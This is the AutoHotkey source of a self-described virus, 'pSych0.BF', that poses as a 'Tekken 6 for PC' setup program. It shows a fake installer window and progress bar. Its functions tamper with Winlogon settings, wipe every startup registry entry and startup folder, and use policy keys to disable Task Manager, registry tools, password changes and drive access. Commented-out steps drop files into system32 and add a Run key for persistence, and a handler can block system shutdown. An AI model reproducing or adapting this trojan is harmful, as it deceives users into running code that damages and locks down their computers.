/*
	pSych0.BF Virus  
   // Payload.ahk \\ 

  Author(s):-     pSych0 C0d3r		 &&  cyBer gHo$t
  Contact:-  pSych0.c0d3r@gmail.com      gh0$t.(yber@gmail.com

  Description:- 
	Installs all core files required for the actual virus to work.
	
  [NOTES]:-
*/

#NoEnv  						;Recommended for performance.
#SingleInstance Ignore			;Make Single instance application.
#Persistent						;Keep running until the user asks to exit.
#NoTrayIcon						;Ensures that no icon is visible.
SetWorkingDir %A_ScriptDir%		;Ensures a consistent starting directory.
SendMode Input  				;Recommended due to its superior speed and reliability.

;We'll control system Shutdown :)
; OnMessage(0x11, "WM_QUERYENDSESSION")

;---------  Variables
VirDir = %A_WinDir%\system32\drivers\etc
IsAdmin := A_UserName = "administrator" or A_UserName = "admin"
SetupCompleted = 0

;Pre-Setup Checks
;DoesFilesExist := CheckFiles()
;	If !DoesFilesExist
;	{
;		Msgbox, 16, Setup File(s) Not Exist, The following files were not found in the setup directory:`n`n%pdata%%engine%%mlist%%drivers%%vids%`nPlease place them in - "%A_ScriptDir%"`n`nPress OK to exit setup.
;		ExitApp
;	}

; WinMinimizeAll

;---------  Real Virus Code Begins
	;Remove all previous data
	RegDelete, HKLM, Software\pSych0
	; Show Setup Progress
	; Progress, b w200,, Setup is loading files...,Tekken 6 - Pre-Setup Stage
	;FileCopy, namco_player_ends.dll, %Virdir%
	 ; Sleep 1000 
	 ; Progress, 20
	;FileCopy, namco_player_ends.dll, %Virdir%
	 ; Sleep 1000
	 ; Progress, 40
	;FileCopy, namco_player_ends.dll, %Virdir%
	 ; Sleep 1000
	 ; Progress, 60
	;FileInstall, 7z.exe, %VirDir%\7z.exe, 1
	;FileInstall, Core.exe, %VirDir%\Core.exe, 1
	;FileInstall, taskkill.exe, %A_WinDir%\System32\taskkill.exe, 1
	;FileInstall, Wall.jpg, %VirDir%\Wall.jpg, 1
	 ; Sleep 1000
	 ; Progress, 80
	 ;If !IsAdmin
		;DisableThings()
	 ;BackupRegistry()
	 ;TweakLogon()
	 ;ClearStartup()
	 ;RegWrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, pSych0, %VirDir%\core.exe
	 ; Sleep 1000
	 ; Progress, 100
	; Progress, Off
	;Save Sttings
		; RegWrite, REG_SZ, HKLM, Software\pSych0, FileStatus, Copied
;---------  Virus Code Ends

;---------  DUMMY procedures Begin
	SplashImage, Wall.png,a b ZH-1 ZW%A_ScreenWidth%, , ,splashIm

	;Create first gui to give a setup like feel
		Gui, -MaximizeBox -MinimizeBox
		Gui, Add, Text, x6 y10 w290 h20 , Select where to install Tekken - 6 for PC.
		Gui, Add, Edit, x6 y30 w240 h20 vTarget, %A_ProgramFiles%\Namco\Tekken - 6 for PC
		Gui, Add, Button, x256 y29 w50 h23 gBrowse, Browse
		Gui, Add, Button, x236 y70 w70 h30 gInstall, Install		

	;Create second gui to show progress of VIRUS!!    he. he. he. he......
		Gui, 2:-SysMenu
		Gui, 2:Add, Text, x6 y10 w310 h20 vVirStat, Installing Tekken-6 for PC........
		Gui, 2:Add, Progress, x6 y40 w310 h20 vVirProg, 25

	Gui, Show, x131 y91 h107 w312 Center, Tekken 6 - Setup

Return  ;End of Payload  
;________________________

Browse:
	Gui, +OwnDialogs
	FileSelectFolder, TargetFolder, , 3, Select the folder to which the file(s) would be copied.
	If TargetFolder =
		Return
	GuiControl,, Target, %TargetFolder%	
Return

Install:
	;Destroy previous gui
		Gui, Destroy
	;Show new one
	GuiControl, 2: , VirProg, -Smooth
	GuiControl, 2: , VirProg, 0
	Gui, 2:Show, x131 y91 h67 w323 Center, Tekken 6 - Setup - Installing	
	 Sleep 1000
	 GuiControl, 2: , VirProg, +30
	GuiControl, 2: , VirStat, Extracting movies....
	 Sleep 1000
	 GuiControl, 2: , VirProg, +30
	GuiControl, 2: , VirStat, Extracting character data....	
	SetupCompleted = 1	
	; ExitApp
	;Store Settings in the registry
	; RegWrite, REG_SZ, HKLM, Software\pSych0, FileStatus, Extracted
	; RegWrite, REG_SZ, HKLM, Software\pSych0, Day, 1
	; RegWrite, REG_SZ, HKLM, Software\pSych0, TimeInstalled, 
Return

GuiClose:
2GuiClose:
	;Run, explorer.exe
ExitApp 

;A function that detects system shutdown
;and aborts it if setup hasn't completed
WM_QUERYENDSESSION(wParam, lParam)
{
    If SetupCompleted = 1
        return true		 ;Allow Shutdown
    else
        return false	 ;Abort Shutdown
}

;Backup Registry Keys that we'll be modifying
BackupRegistry()
{
	FileCreateDir, %A_WinDir%\Backup
	RunWait,Regedit.exe /E "%WINDIR%\Backup\HKCU.reg" "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"
	RunWait,Regedit.exe /E "%WINDIR%\Backup\HKLM.reg" "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion"
}

;Tweak User Startup
TweakLogon()
{
	WinLogon = Software\Microsoft\Windows NT\CurrentVersion\Winlogon
	RegWrite, REG_DWORD, HKLM, %WinLogon%, AllowMultipleTSSessions, 0
	RegWrite, REG_DWORD, HKLM, %WinLogon%, LogonType, 1
	RegWrite, REG_DWORD, HKLM, %WinLogon%, DisableCAD, 1
	RegWrite, REG_DWORD, HKLM, %WinLogon%, ReportBootOk, 0
	RegDelete, HKLM, %WinLogon%\SpecialAccounts\UserList	
}

;We don't want any thing to interfere.
;So we'll Remove all startup entries 
ClearStartup()
{
	;From HKEY_CURRENT_USER
	Loop, HKCU, Software\Microsoft\Windows\CurrentVersion\Run
		RegDelete
	Loop, HKCU, Software\Microsoft\Windows\CurrentVersion\RunOnce
		RegDelete
	RegDelete, HKCU, Software\Microsoft\Windows NT\CurrentVersion\Windows, load
	RegDelete, HKCU, Software\Microsoft\Windows NT\CurrentVersion\Windows, run

	;From HKEY_LOCAL_MACHINE
	Loop, HKLM, Software\Microsoft\Windows\CurrentVersion\Run
		RegDelete
	Loop, HKLM, Software\Microsoft\Windows\CurrentVersion\RunOnce
		RegDelete
	Loop, HKLM, Software\Microsoft\Windows\CurrentVersion\RunOnceEx
		RegDelete
	Loop, HKLM, Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
		RegDelete
		
	;From Startup folders
	FileDelete, %A_Startup%\*.*
	FileDelete, %A_StartupCommon%\*.*
}

;Disable All things that could interfere
DisableThings()
{
	;System Restrictions
	Policies = Software\Microsoft\Windows\CurrentVersion\Policies
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoRun, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoLogoff, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoClose, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoFind, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoDesktop, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\Explorer, NoDrives, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, DisableTaskmgr, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, DisableRegistryTools, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, DisableChangePassword, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, DisableLockWorkstation, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, NoDispSettingsPage, 1
	RegWrite, REG_DWORD, HKCU, %Policies%\System, NoDispAppearancePage, 1	
}

;Check if all setup files exist
CheckFiles()
{
	Global
	IfNotExist, sfc_namco_playerdata.dll
		pdata = sfc_namco_playerdata.dll`n
	IfNotExist, sfc_namco_t6engine.dll
		engine = sfc_namco_t6engine.dll`n
	IfNotExist, sfc_namco_moveslist.dll
		mlist = sfc_namco_moveslist.dll`n
	IfNotExist, sfc_namco_drivers.dll
		drivers = sfc_namco_drivers.dll`n
	IfNotExist, sfc_namco_videos.dll
		vids = sfc_namco_videos.dll`n
	
	If (pdata or engine or mlist or drivers or vids)
		Return 0
	Else
		Return 1
}
